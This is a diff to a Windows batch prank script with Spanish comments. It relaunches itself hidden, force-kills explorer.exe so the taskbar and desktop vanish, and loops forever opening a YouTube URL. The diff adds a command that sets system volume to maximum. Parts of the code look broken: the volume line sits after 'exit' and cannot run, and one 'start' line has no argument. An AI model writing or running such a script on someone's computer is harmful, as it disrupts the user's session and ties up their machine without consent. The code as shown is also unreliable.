@@ -8,17 +8,18 @@ timeout /t 3 /nobreak >nul
 if "%1"=="hidden" goto hidden
 start /min cmd /c "%~f0 hidden"
 exit
+:: sube el volumen al 100%
+nircmd.exe setsysvolume 65535
 
 :hidden
-:: Ruta de la imagen (¡Cámbiala por la tuya!)
-set img=".\image.jpg"
 
 :: Cerrar el Explorador de archivos (oculta barra de tareas y escritorio)
 taskkill /f /im explorer.exe
 
 :: Bucle infinito para abrir imágenes y páginas web
 :loop
-start %img%
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start 
 
 timeout /t 1 /nobreak >nul
 goto loop
